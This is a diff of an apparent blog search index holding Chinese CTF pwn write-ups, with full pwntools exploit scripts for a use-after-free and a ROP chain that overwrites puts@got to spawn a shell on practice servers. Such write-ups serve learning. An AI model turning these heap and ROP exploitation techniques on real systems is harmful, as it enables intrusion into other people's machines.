@@ -1,44 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CISCN_2019</title>
-    <url>/article/CISCN_2019/</url>
-    <content><![CDATA[<h1 id="CISCN-2019"><a href="#CISCN-2019" class="headerlink" title="CISCN_2019"></a>CISCN_2019</h1><span id="more"></span>
-
-<h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
-<p><img src="/article/CISCN_2019/image-20210526120532732.png" alt="image-20210526120532732"></p>
-<p>ida</p>
-<ul>
-<li>new</li>
-</ul>
-<p><img src="/article/CISCN_2019/image-20210526121417172.png" alt="image-20210526121417172"></p>
-<ul>
-<li><p>del</p>
-<p><img src="/article/CISCN_2019/image-20210526121954287.png" alt="image-20210526121954287"></p>
-</li>
-<li><p>dump</p>
-<p><img src="/article/CISCN_2019/image-20210526122032820.png" alt="image-20210526122032820"></p>
-</li>
-</ul>
-<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>uaf漏洞。程序new之前先malloc了0xC的chunk，用来存放 print 和 free 指针</p>
-<ul>
-<li>1、直接写入数值</li>
-<li>2、写入一个指向string的chunk指针</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/CISCN_2019/image-20210526123328831.png" alt="image-20210526123328831"></p>
-<p>根据 fastbin FILO 的特性，执行 free(0)、free(1) ，再new一个string类型，便可以修改 free 指针为 system_plt，同时 string 指针的最后一个字节会被修改为 \n (0x0a)，就刚好指向了 print 指针处，把这个地方修改为 bash。执行 free(0) -&gt; system(‘bash’)，达成getshell</p>
-<p><img src="/article/CISCN_2019/image-20210526124650393.png" alt="image-20210526124650393"></p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CISCN_2021</title>
     <url>/article/CISCN_2021/</url>
     <content><![CDATA[<h1 id="CISCN-2021"><a href="#CISCN-2021" class="headerlink" title="CISCN_2021"></a>CISCN_2021</h1><span id="more"></span>
@@ -108,6 +70,44 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map</span><br><span class="line">00000</span><br><span class="line">00000</span><br><span class="line">04400</span><br><span class="line">00030</span><br><span class="line">00010</span><br></pre></td></tr></table></figure>
 
 <p>最后 md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CISCN_2019</title>
+    <url>/article/CISCN_2019/</url>
+    <content><![CDATA[<h1 id="CISCN-2019"><a href="#CISCN-2019" class="headerlink" title="CISCN_2019"></a>CISCN_2019</h1><span id="more"></span>
+
+<h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
+<p><img src="/article/CISCN_2019/image-20210526120532732.png" alt="image-20210526120532732"></p>
+<p>ida</p>
+<ul>
+<li>new</li>
+</ul>
+<p><img src="/article/CISCN_2019/image-20210526121417172.png" alt="image-20210526121417172"></p>
+<ul>
+<li><p>del</p>
+<p><img src="/article/CISCN_2019/image-20210526121954287.png" alt="image-20210526121954287"></p>
+</li>
+<li><p>dump</p>
+<p><img src="/article/CISCN_2019/image-20210526122032820.png" alt="image-20210526122032820"></p>
+</li>
+</ul>
+<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>uaf漏洞。程序new之前先malloc了0xC的chunk，用来存放 print 和 free 指针</p>
+<ul>
+<li>1、直接写入数值</li>
+<li>2、写入一个指向string的chunk指针</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/CISCN_2019/image-20210526123328831.png" alt="image-20210526123328831"></p>
+<p>根据 fastbin FILO 的特性，执行 free(0)、free(1) ，再new一个string类型，便可以修改 free 指针为 system_plt，同时 string 指针的最后一个字节会被修改为 \n (0x0a)，就刚好指向了 print 指针处，把这个地方修改为 bash。执行 free(0) -&gt; system(‘bash’)，达成getshell</p>
+<p><img src="/article/CISCN_2019/image-20210526124650393.png" alt="image-20210526124650393"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>WriteUp</category>
@@ -805,24 +805,6 @@
       </categories>
   </entry>
   <entry>
-    <title>V&amp;NCTF2022</title>
-    <url>/article/V&amp;NCTF2022/</url>
-    <content><![CDATA[<h1 id="V-amp-NCTF2022"><a href="#V-amp-NCTF2022" class="headerlink" title="V&amp;NCTF2022"></a>V&amp;NCTF2022</h1><h1 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h1><p><img src="/article/V&NCTF2022/image-20220225153956554.png" alt="image-20220225153956554"></p>
-<p><img src="/article/V&NCTF2022/image-20220225153934386.png" alt="image-20220225153934386"></p>
-<p><img src="/article/V&NCTF2022/image-20220225153923845.png" alt="image-20220225153923845"></p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>栈溢出。利用end2函数泄露libc，再回到main函数的 <code>mov eax, 0</code>，调用sysread写system地址到 <code>puts@got</code> ，最后 <code>call puts</code> 即 getshell。</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;clear_got&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">20002</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">syscall = <span class="number">0x00000000040077E</span></span><br><span class="line">syswrite = <span class="number">0x0000000000400774</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007f3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004007f1</span></span><br><span class="line">bss = <span class="number">0x60107C</span></span><br><span class="line">mov_eax = <span class="number">0x00000000040075C</span></span><br><span class="line">call_puts = <span class="number">0x00000000040071E</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;competition.///&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(libc_main_got) + p64(<span class="number">0</span>) + p64(syswrite) </span><br><span class="line">payload += p64(mov_eax) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(puts_got)*<span class="number">2</span> + p64(syscall) </span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got+<span class="number">8</span>) + p64(call_puts)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_main = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_main: &#x27;</span> + <span class="built_in">hex</span>(libc_main))</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(system_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
     <title>XCTF-SUSCTF2022</title>
     <url>/article/XCTF-SUSCTF2022/</url>
     <content><![CDATA[<h1 id="XCTF-SUSCTF2022"><a href="#XCTF-SUSCTF2022" class="headerlink" title="XCTF-SUSCTF2022"></a>XCTF-SUSCTF2022</h1><span id="more"></span>
@@ -882,42 +864,13 @@
       </categories>
   </entry>
   <entry>
-    <title>glibc-all-in-one</title>
-    <url>/article/glibc-all-in-one/</url>
-    <content><![CDATA[<h1 id="记glibc-all-in-one使用"><a href="#记glibc-all-in-one使用" class="headerlink" title="记glibc-all-in-one使用"></a>记glibc-all-in-one使用</h1><span id="more"></span>
-
-<p><a href="https://mp.weixin.qq.com/s/UAQswvnasJ0a40ibSy4ppg">参考</a></p>
-<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><h2 id="glibc-all-in-one下载"><a href="#glibc-all-in-one下载" class="headerlink" title="glibc-all-in-one下载"></a>glibc-all-in-one下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br></pre></td></tr></table></figure>
-
-<h2 id="glibc-all-in-one安装"><a href="#glibc-all-in-one安装" class="headerlink" title="glibc-all-in-one安装"></a>glibc-all-in-one安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo python3 update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><img src="/article/glibc-all-in-one/image-20211012172502704.png" alt="image-20211012172502704"></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download 2.31-0ubuntu9_amd64</span><br></pre></td></tr></table></figure>
-
-<h3 id="old-list"><a href="#old-list" class="headerlink" title="old_list"></a>old_list</h3><p>和上面差不多</p>
-<p><img src="/article/glibc-all-in-one/image-20211012172551035.png" alt="image-20211012172551035"></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download_old 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure>
-
-<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><h2 id="patchelf下载"><a href="#patchelf下载" class="headerlink" title="patchelf下载"></a>patchelf下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br></pre></td></tr></table></figure>
-
-<h2 id="patchelf安装"><a href="#patchelf安装" class="headerlink" title="patchelf安装"></a>patchelf安装</h2><p>这里我的ubuntu16没有报错，挺顺利</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh //如果报错 ./bootstrap.sh: 2: autoreconf: not found                 </span><br><span class="line">				//执行这个   sudo apt-get install autoconf automake libtool</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one$ sudo ./download 2.27-3ubuntu1_amd64</span><br></pre></td></tr></table></figure>
-
-<p>打开隐藏文件</p>
-<p><code>Ctrl + h</code></p>
-<p>可以先在这个目录下 <code>pwd</code>一下</p>
-<p><img src="/article/glibc-all-in-one/image-20211012180509161.png" alt="image-20211012180509161"></p>
-<p><img src="/article/glibc-all-in-one/image-20211012180244757.png" alt="image-20211012180244757"></p>
-<p>解压下载的<code>deb</code>包到<code>.debug</code>中</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one/debs$ sudo dpkg -X [libc6_2.27-3ubuntu1_amd64.deb] /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/.debug</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>
-
-<p>然后利用patchelf工具修改elf程序所需的动态链接库</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br><span class="line">patchelf --set-interpreter /home/trick/tools/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/tools/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br></pre></td></tr></table></figure>
-
-<p>glibc2.34</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/tools/glibc-2.34/glibc-2.34/64/lib/ld-linux-x86-64.so.2 ./pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/tools/glibc-2.34/glibc-2.34/64/lib/libc.so.6 ./pwn</span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter ./ld.so ./pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure>
+    <title>V&amp;NCTF2022</title>
+    <url>/article/V&amp;NCTF2022/</url>
+    <content><![CDATA[<h1 id="V-amp-NCTF2022"><a href="#V-amp-NCTF2022" class="headerlink" title="V&amp;NCTF2022"></a>V&amp;NCTF2022</h1><h1 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h1><p><img src="/article/V&NCTF2022/image-20220225153956554.png" alt="image-20220225153956554"></p>
+<p><img src="/article/V&NCTF2022/image-20220225153934386.png" alt="image-20220225153934386"></p>
+<p><img src="/article/V&NCTF2022/image-20220225153923845.png" alt="image-20220225153923845"></p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>栈溢出。利用end2函数泄露libc，再回到main函数的 <code>mov eax, 0</code>，调用sysread写system地址到 <code>puts@got</code> ，最后 <code>call puts</code> 即 getshell。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;clear_got&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">20002</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">syscall = <span class="number">0x00000000040077E</span></span><br><span class="line">syswrite = <span class="number">0x0000000000400774</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007f3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004007f1</span></span><br><span class="line">bss = <span class="number">0x60107C</span></span><br><span class="line">mov_eax = <span class="number">0x00000000040075C</span></span><br><span class="line">call_puts = <span class="number">0x00000000040071E</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;competition.///&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(libc_main_got) + p64(<span class="number">0</span>) + p64(syswrite) </span><br><span class="line">payload += p64(mov_eax) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(puts_got)*<span class="number">2</span> + p64(syscall) </span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got+<span class="number">8</span>) + p64(call_puts)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_main = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_main: &#x27;</span> + <span class="built_in">hex</span>(libc_main))</span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(system_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
@@ -925,7 +878,7 @@
 
 ]]></content>
       <categories>
-        <category>笔记</category>
+        <category>WriteUp</category>
       </categories>
   </entry>
   <entry>
@@ -1034,6 +987,53 @@
 <li>给出参数 ‘sh’，调用 atoi 函数拿 shell</li>
 </ul>
 <h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27833</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = 